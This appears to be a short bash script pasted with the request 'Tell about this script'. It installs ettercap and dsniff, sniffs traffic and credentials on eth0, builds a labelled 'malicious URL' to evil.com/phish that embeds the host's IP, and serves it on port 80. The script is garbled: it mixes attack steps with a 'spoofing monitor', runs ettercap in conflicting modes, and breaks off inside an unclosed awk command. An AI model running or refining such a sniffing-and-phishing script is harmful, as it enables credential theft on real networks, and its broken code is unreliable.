#!/bin/bash

# Check if the script is run as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

# Install necessary tools
sudo apt-get update
sudo apt-get install -y ettercap-text-only dsniff

# Configure ettercap
ettercap -G

# Start ettercap
ettercap -Tq -i eth0

# Sniff traffic for IP and MAC addresses
dsniff -i eth0

# Monitor for IP and MAC address spoofing attempts
echo "Monitoring for IP and MAC address spoofing attempts..."
tail -f /var/log/syslog | grep "spoofed"

# Create a malicious URL
malicious_url="http://evil.com/phish?ip=$(ifconfig eth0 | awk '/inet >

# Display the malicious URL
echo "Malicious URL: $malicious_url"

# Start a web server to host the malicious URL
python3 -m http.server 80

Tell about this script
